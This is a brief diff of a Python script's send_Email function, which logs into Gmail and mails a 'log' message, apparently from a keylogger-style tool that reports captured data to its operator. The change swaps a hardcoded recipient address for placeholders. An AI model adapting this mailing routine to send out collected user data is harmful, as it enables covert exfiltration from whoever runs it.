@@ -14,11 +14,11 @@ log = ''
 
 def send_Email(msg):
 
-    gmail_user = ''  
-    gmail_password = ''
+    gmail_user = '' #enter e-mail you want to be sent
+    gmail_password = '' #enter password for user e-mail
 
     sent_from = gmail_user  
-    to = ['artursarad@gmail.com', 'artursarad@gmail.com']  
+    to = ['', '']  #enter e-mail
     subject = 'Rofl'  
     body = msg
 
@@ -46,6 +46,9 @@ def send_Email(msg):
         print('Email sent!')
     except:
         pass
+    
+
+
 
 
 
